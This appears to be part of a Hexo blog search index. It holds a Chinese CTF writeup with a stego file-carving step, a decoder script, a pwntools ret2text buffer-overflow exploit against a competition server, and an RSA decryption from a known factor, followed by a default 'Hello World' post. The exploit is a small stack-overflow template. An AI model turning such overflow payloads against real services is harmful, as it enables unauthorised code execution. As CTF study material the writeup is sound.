class="markdownIt-Anchor" href="#robot36"></a> robot36</h2><p>010editor打开，看到cover.png结尾有东西</p><p>22541</p><p>查到wav文件头是RIFF，找到后删去前面的内容，另存为1.wav。然后用robot36处理。</p><p>22673</p><h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> re</h1><h2 id="pyencode"><a class="markdownIt-Anchor" href="#pyencode"></a> pyencode</h2><p>gpt秒了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">restore_string</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        nums <span class="token operator">=</span> ret<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span>        num1_high <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">3</span>        num1_low <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">3</span>        num2_low <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        num2_high <span class="token operator">=</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0b00000111</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span>        num2 <span class="token operator">=</span> num2_high<span class="token operator">+</span>num2_low        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>num1_high<span class="token operator">+</span>num1_low<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> sret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span>result <span class="token operator">=</span> restore_string<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> pwn</h1><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text"></a> ret2text</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ctf.l3hsec.com'</span><span class="token punctuation">,</span><span class="token number">40008</span><span class="token punctuation">)</span>read_flag <span class="token operator">=</span> <span class="token number">0x4007D8</span>ret <span class="token operator">=</span> <span class="token number">0x40089d</span><span class="token comment"># 对齐</span>buf <span class="token operator">=</span> <span class="token string">b'1'</span><span class="token operator">*</span><span class="token number">0x18</span>payload <span class="token operator">=</span> buf <span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_flag<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> CRYPTO</h1><h2 id="factor"><a class="markdownIt-Anchor" href="#factor"></a> factor</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token number">11818626157955143367425397134539988701945901292912494601671841920448950142432716617641692683670072692623351876503702080986305564988430515942372445616530643</span>n <span class="token operator">=</span> <span class="token number">155973472877500551696404049342507495077134952416313340244284845928778400385389548636037403472336378336490931666382159990607516752340206514340009510417187026921007116552045963973163720919596636575029141772459275706505175142195195686881713118383919643653234410908740422880120161538592336383479253864155940629093</span>q<span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token keyword">assert</span> p<span class="token operator">*</span>q <span class="token operator">==</span> ne <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">32349988441710439726991823014652327949110727303493414402820119679942533399117470462729126720315109509283386087378965374529410971247867614623318967344071216979994926505735379297102144644819487720051553195643392945426400493308569024431403247836671630208580022421678378308476007451938426212992790979191141986943</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/14/hello-world/"/>
      <url>/2023/09/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h4 id="打包"><a class="markdownIt-Anchor" href="#打包"></a> 打包<a href="https://yunyoujun.github.io/posts/how-to-write-a-web-component#%E6%89%93%E5%8C%85"></a></h4><p>因为我们尽量想要独立使用，所以需要配置一下 vite，以便在打包时不会将 lit 代码排除。</p><p>ts</p><pre class="line-numbers language-none"><code class="language-none">import &#123; defineConfig &#125; from &#39;vite&#39;&#x2F;&#x2F; https:&#x2F;&#x2F;vitejs.dev&#x2F;config&#x2F;export default defineConfig(&#123;  build: &#123;    lib: &#123;      entry: &#39;src&#x2F;index.ts&#39;,      formats: [&#39;es&#39;],      fileName: format &#x3D;&gt; &#96;index.$&#123;format&#125;.js&#96;,    &#125;,    &#x2F;&#x2F; Because we try to use it independently, we don’t exclude lit.    &#x2F;&#x2F; rollupOptions: &#123;    &#x2F;&#x2F;   external: &#x2F;^lit&#x2F;,    &#x2F;&#x2F; &#125;,  &#125;,&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
